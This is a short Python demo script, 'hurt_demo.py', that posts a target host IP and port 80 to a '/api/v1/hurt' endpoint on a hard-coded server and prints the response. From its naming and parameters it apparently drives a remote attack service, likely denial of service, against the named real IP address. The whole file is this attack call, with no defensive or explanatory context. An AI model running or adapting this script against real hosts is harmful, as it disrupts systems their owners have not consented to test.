# -*- coding:utf-8 -*-
# @time     : 2022-07-12 11:12:48
# @File     : hurt_demo.py
# @Author   : Twoyear


import requests


url = 'http://82.157.105.137:1999/api/v1/hurt'

data = {
    'host': '8.130.26.206',
    'port': '80',
}
dd = requests.post(url, data=data)
print(dd.json())